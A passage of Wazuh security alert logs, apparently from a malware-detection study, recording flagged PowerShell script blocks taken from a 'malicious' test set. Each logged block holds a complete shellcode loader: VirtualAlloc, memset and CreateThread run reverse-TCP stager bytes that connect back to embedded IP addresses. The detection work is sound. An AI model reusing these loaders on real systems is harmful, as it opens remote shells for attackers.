0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xcb,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 4709598c-6ec2-4a22-b694-263de5455463\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1827.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xcb,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"4709598c-6ec2-4a22-b694-263de5455463","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1827.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:19.077+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":48,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015659.754465","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:48.7654608Z","eventRecordID":"201030","processID":"9044","threadID":"10376","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0c,0x68,0x02,0x00,0x01,0xbc,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 846a81ac-4928-4d3b-94cd-a57845ff5e8b\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1836.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0c,0x68,0x02,0x00,0x01,0xbc,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"846a81ac-4928-4d3b-94cd-a57845ff5e8b","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1836.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:20.109+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":49,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015660.765415","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:49.7040580Z","eventRecordID":"201034","processID":"4712","threadID":"5580","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x25,0xee,0x8c,0x95,0x68,0x02,0x00,0x11,0x52,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: d5b86a3b-8d6e-474c-ba8e-cb899b00cef2\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\184.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x25,0xee,0x8c,0x95,0x68,0x02,0x00,0x11,0x52,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"d5b86a3b-8d6e-474c-ba8e-cb899b00cef2","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\184.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:20.155+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":50,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015660.776415","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:50.5906450Z","eventRecordID":"201038","processID":"10696","threadID":"2956","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xb5,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: e86c52b4-ea7c-4deb-b48f-2fd2d99b51b1\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1870.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,